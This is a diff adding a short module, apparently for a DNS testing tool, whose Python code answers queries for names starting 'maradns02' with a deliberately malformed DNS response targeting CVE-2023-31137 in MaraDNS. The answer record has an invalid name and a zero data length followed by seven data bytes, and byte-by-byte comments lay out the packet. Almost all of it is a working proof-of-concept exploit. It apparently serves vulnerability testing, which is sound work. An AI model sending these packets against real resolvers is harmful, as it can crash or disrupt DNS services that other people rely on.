@@ -1,0 +1,36 @@
+[module]
+name = "maradns02"
+info = ""
+desc = ""
+type = "feature"
+author = "ivan.jedek@oryxlabs.com"
+
+code = '''
+if req.first_subdomain.startswith("maradns02"):
+   # CVE-2023-31137
+   # 05 39 # Transaction ID
+   # 81 a0 # Flags
+   # 00 00 # QDCount
+   # 00 01 # ANCount
+   # 00 00 # NSCount
+   # 00 00 # ARCount
+   # 
+   # 00    # Invalid qname. Using a valid name or "\xc0\x0c" also works.
+   # 00 10 # Qtype 16  (TXT Record)
+   # 00 01 # Class 1   (NS)
+   # 00 00 01 2c # TTL (300)
+   # 00 00 # RDlen
+   # 07 68 74 65 6a 65 64 61 #RData "htejeda"
+   ### DNS header ########
+   buffer = prep_dns_header(b'\x81\xa0', 0, 1, 0, 0)
+   ### QUESTION SECTION ########
+   ### ANSWER SECTION ########
+   buffer += b'\x00' + getTypeBin("TXT") + getClassBin("IN")
+   buffer += struct.pack(">L", resp.TTL)           ## TTL
+   buffer += struct.pack(">H", 0)                  ## Data length
+   buffer +=  b'\x07htejeda'
+   # log and send
+   log("maradns01poc")
+   send_buf(self, buffer)
+   #####################################################################
+'''
